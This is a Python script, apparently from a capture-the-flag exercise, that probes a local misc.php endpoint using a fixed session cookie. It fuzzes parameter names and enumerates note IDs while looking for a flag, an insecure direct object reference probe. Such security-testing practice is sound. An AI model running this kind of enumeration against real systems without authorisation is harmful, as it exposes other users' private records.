import requests, time, sys

# Test connectivity to target first
print("[*] Testing initial connectivity...")
try:
    test_resp = requests.get('http://127.0.0.1/', timeout=30)
    print(f"[+] Root endpoint reachable: Status {test_resp.status_code}")
except Exception as e:
    print(f"[-] Cannot reach target: {e}")
    sys.exit(1)

# Now test misc.php specifically
session = requests.Session()
session.cookies['PHPSESSID'] = '17f3f417d868573c3079e3f6ee928eb6'
session.headers['User-Agent'] = 'Security-Testing/1.0'

print("\n[*] Testing misc.php endpoint...")
try:
    resp = session.get('http://127.0.0.1/misc.php', timeout=30)
    print(f"[+] misc.php accessible: Status {resp.status_code}, Length {len(resp.text)}")
except Exception as e:
    print(f"[-] misc.php error: {e}")

# Parameter combinations to test
params_to_test = [
    {'note_id': 1},
    {'noteid': 1},
    {'id': 1},
    {'note': 1},
    {'nid': 1},
    {'note_id': 1, 'action': 'view'},
    {'noteid': 1, 'action': 'view'},
]

print("\n[*] Testing parameter combinations with note ID 1...")
for params in params_to_test:
    try:
        resp = session.get('http://127.0.0.1/misc.php', params=params, timeout=30)
        if resp.text and len(resp.text.strip()) > 0:
            preview = resp.text.replace('\n', ' ').strip()[:100]
            print(f"[!] {params} -> Status: {resp.status_code}, Len: {len(resp.text)}, Preview: {preview}")
    except Exception as e:
        print(f"[-] Error with {params}: {e}")
    time.sleep(0.5)

print("\n[*] Testing additional note IDs 2-10 with 'id' parameter...")
for nid in range(2, 11):
    try:
        resp = session.get('http://127.0.0.1/misc.php', params={'id': nid}, timeout=30)
        if resp.text and len(resp.text.strip()) > 0:
            preview = resp.text.replace('\n', ' ').strip()[:100]
            print(f"[!] id={nid} -> Status: {resp.status_code}, Len: {len(resp.text)}, Preview: {preview}")
            if 'FLAG{' in resp.text:
                print(f"[CRITICAL] FLAG FOUND in response to id={nid}")
    except Exception as e:
        print(f"[-] Error with id={nid}: {e}")
    time.sleep(0.5)

print("\n[*] Testing completed")
